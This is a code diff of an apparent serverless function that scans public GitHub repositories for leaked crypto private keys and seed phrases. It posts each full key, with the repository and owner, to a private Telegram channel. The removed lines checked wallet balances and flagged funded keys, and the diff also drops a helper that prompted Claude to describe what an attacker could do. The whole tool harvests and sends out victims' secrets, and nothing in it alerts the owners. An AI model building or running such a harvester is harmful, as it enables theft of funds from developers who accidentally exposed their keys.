@@ -15,52 +15,7 @@ const corsHeaders = {
 const CHAT_ID_ALL = '-1003113285705';  // Channel "Find it"
 const CHAT_ID_FUNDED = '-1002944547225';  // Channel "It's found"
 
-// Helper IA - Analyse du danger avec Claude
-async function analyzeWithAI(keyType: string, fullKey: string, content: string, blockchain: string): Promise<string> {
-  const anthropicKey = Deno.env.get('ANTHROPIC_API_KEY');
-  if (!anthropicKey) return '';
-
-  try {
-    const prompt = `Tu es un expert en cybersécurité crypto. Une clé privée ${keyType} (${blockchain}) a été trouvée publiquement sur GitHub.
-
-Clé: ${fullKey.substring(0, 50)}...
-Contexte: ${content.substring(0, 200)}...
-
-Explique en 3-4 phrases COURTES:
-1. Quel est le danger immédiat?
-2. Que peut faire un attaquant avec ça?
-3. Quels fonds/données sont en danger?
-
-Sois DIRECT et ALARMISTE. Format: texte brut sans markdown.`;
-
-    const response = await fetch('https://api.anthropic.com/v1/messages', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-api-key': anthropicKey,
-        'anthropic-version': '2023-06-01',
-      },
-      body: JSON.stringify({
-        model: 'claude-3-5-sonnet-20241022',
-        max_tokens: 300,
-        messages: [{
-          role: 'user',
-          content: prompt,
-        }],
-      }),
-    });
-
-    if (!response.ok) return '';
-
-    const data = await response.json();
-    return data.content?.[0]?.text || '';
-  } catch (e) {
-    console.error('AI analysis error:', e);
-    return '';
-  }
-}
-
-// Helper Telegram
+// Helper Telegram (simplifié)
 async function sendTelegram(message: string, chatId: string) {
   const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
   if (!botToken) return;
@@ -482,132 +437,27 @@ ${fileContent}
                 return lower.includes(keyword) || nameLower.includes(keyword);
               });
 
-              // ENVOI AUTOMATIQUE au canal FUNDED pour:
-              // 1. Si balance > 0
-              // 2. OU si c'est une clé privée crypto (NOUVEAU)
-              if (balanceInfo.hasBalance || isCryptoPrivateKey) {
-                // Déterminer la blockchain potentielle - LISTE COMPLÈTE
+              // ENVOI AUTOMATIQUE au canal FUNDED si c'est une clé crypto
+              if (isCryptoPrivateKey) {
+                // Déterminer la blockchain potentielle
                 let blockchain = '🔐 Crypto Wallet';
                 const patternLower = pattern.pattern_type.toLowerCase();
                 const nameLower = pattern.pattern_name.toLowerCase();
                 const combined = `${patternLower} ${nameLower}`;
                 
-                // Ethereum & EVM chains
-                if (combined.includes('eth') || combined.includes('ethereum')) {
-                  blockchain = '⟠ Ethereum';
-                } else if (combined.includes('polygon') || combined.includes('matic')) {
-                  blockchain = '🟣 Polygon';
-                } else if (combined.includes('bsc') || combined.includes('binance chain') || combined.includes('bnb chain')) {
-                  blockchain = '🟡 BNB Chain';
-                } else if (combined.includes('avalanche') || combined.includes('avax')) {
-                  blockchain = '🔺 Avalanche';
-                } else if (combined.includes('arbitrum')) {
-                  blockchain = '🔵 Arbitrum';
-                } else if (combined.includes('optimism')) {
-                  blockchain = '🔴 Optimism';
-                  
-                // Bitcoin
-                } else if (combined.includes('btc') || combined.includes('bitcoin')) {
-                  blockchain = '₿ Bitcoin';
-                  
-                // Solana
-                } else if (combined.includes('sol') || combined.includes('solana') || combined.includes('phantom')) {
-                  blockchain = '◎ Solana';
-                  
-                // Cardano
-                } else if (combined.includes('ada') || combined.includes('cardano')) {
-                  blockchain = '🅰️ Cardano';
-                  
-                // Polkadot
-                } else if (combined.includes('dot') || combined.includes('polkadot')) {
-                  blockchain = '🟣 Polkadot';
-                } else if (combined.includes('kusama') || combined.includes('ksm')) {
-                  blockchain = '🦅 Kusama';
-                  
-                // Tron
-                } else if (combined.includes('trx') || combined.includes('tron')) {
-                  blockchain = '🔷 Tron';
-                  
-                // Ripple
-                } else if (combined.includes('xrp') || combined.includes('ripple')) {
-                  blockchain = '💧 Ripple (XRP)';
-                  
-                // Litecoin
-                } else if (combined.includes('ltc') || combined.includes('litecoin')) {
-                  blockchain = 'Ł Litecoin';
-                  
-                // Dogecoin
-                } else if (combined.includes('doge') || combined.includes('dogecoin')) {
-                  blockchain = '🐕 Dogecoin';
-                  
-                // Monero
-                } else if (combined.includes('xmr') || combined.includes('monero')) {
-                  blockchain = '🔒 Monero';
-                  
-                // Cosmos
-                } else if (combined.includes('atom') || combined.includes('cosmos')) {
-                  blockchain = '⚛️ Cosmos';
-                  
-                // Near
-                } else if (combined.includes('near')) {
-                  blockchain = '🌐 Near';
-                  
-                // Algorand
-                } else if (combined.includes('algo') || combined.includes('algorand')) {
-                  blockchain = '▲ Algorand';
-                  
-                // Tezos
-                } else if (combined.includes('xtz') || combined.includes('tezos')) {
-                  blockchain = '🔷 Tezos';
-                  
-                // Stellar
-                } else if (combined.includes('xlm') || combined.includes('stellar')) {
-                  blockchain = '⭐ Stellar';
-                  
-                // Seed phrases (multi-chain)
-                } else if (combined.includes('mnemonic') || combined.includes('seed') || combined.includes('recovery')) {
-                  blockchain = '🔑 Multi-chain (BIP39)';
-                  
-                // Exchanges
-                } else if (combined.includes('binance')) {
-                  blockchain = '🅱️ Binance Exchange';
-                } else if (combined.includes('coinbase')) {
-                  blockchain = '🟦 Coinbase Exchange';
-                } else if (combined.includes('kraken')) {
-                  blockchain = '🐙 Kraken Exchange';
-                } else if (combined.includes('kucoin')) {
-                  blockchain = '🟢 KuCoin Exchange';
-                } else if (combined.includes('bybit')) {
-                  blockchain = '🟡 Bybit Exchange';
-                } else if (combined.includes('okx')) {
-                  blockchain = '⚫ OKX Exchange';
-                }
-
-                // ANALYSE IA du danger (désactivée temporairement pour performance)
-                // await sendTelegram(`🤖 *Analyse IA en cours...*`, CHAT_ID_FUNDED);
-                const aiAnalysis = ''; // await analyzeWithAI(pattern.pattern_type, fullKey, content, blockchain);
-
-                // Message SIMPLE et BRUT avec IA
-                let fundedMsg = '';
+                // Détection blockchain simplifiée
+                if (combined.includes('eth') || combined.includes('ethereum')) blockchain = '⟠ Ethereum';
+                else if (combined.includes('polygon') || combined.includes('matic')) blockchain = '🟣 Polygon';
+                else if (combined.includes('bsc') || combined.includes('bnb')) blockchain = '🟡 BNB Chain';
+                else if (combined.includes('btc') || combined.includes('bitcoin')) blockchain = '₿ Bitcoin';
+                else if (combined.includes('sol') || combined.includes('solana')) blockchain = '◎ Solana';
+                else if (combined.includes('mnemonic') || combined.includes('seed')) blockchain = '🔑 Multi-chain (BIP39)';
+                else if (combined.includes('binance')) blockchain = '🅱️ Binance';
+                else if (combined.includes('coinbase')) blockchain = '🟦 Coinbase';
                 
-                if (balanceInfo.hasBalance) {
-                  // Cas 1: Balance détectée
-                  fundedMsg = `
-🚨 *BALANCE POSITIVE !* 🚨
-
-💰 *${balanceInfo.balance} ${balanceInfo.currency}* ($${balanceInfo.balanceUSD?.toFixed(2)})
-⛓️ ${balanceInfo.blockchain}
-
-🔑 *CLÉ:*
-\`${fullKey}\`
-
-📍 ${item.repository.full_name}
-👤 @${item.repository.owner.login}
-                  `.trim();
-                } else {
-                  // Cas 2: Clé privée crypto (sans balance vérifiée)
-                  fundedMsg = `
-🔑 *CLÉ PRIVÉE CRYPTO*
+                // Message SIMPLE pour le canal FUNDED
+                const fundedMsg = `
+🔑 *CLÉ CRYPTO DÉTECTÉE*
 
 ⛓️ ${blockchain}
 
@@ -616,25 +466,11 @@ ${fileContent}
 
 📍 ${item.repository.full_name}
 👤 @${item.repository.owner.login}
-                  `.trim();
-                }
-
-                await sendTelegram(fundedMsg, CHAT_ID_FUNDED);
-
-                // Message IA séparé
-                if (aiAnalysis) {
-                  const aiMsg = `
-⚠️ *ANALYSE IA - DANGER*
-
-${aiAnalysis}
-
 🔗 [Voir le repo](${item.repository.html_url})
-                  `.trim();
-                  await sendTelegram(aiMsg, CHAT_ID_FUNDED);
-                }
-                if (balanceInfo.hasBalance) {
-                  fundedCount++;
-                }
+                `.trim();
+                
+                await sendTelegram(fundedMsg, CHAT_ID_FUNDED);
+                fundedCount++;
               }
             }
           }
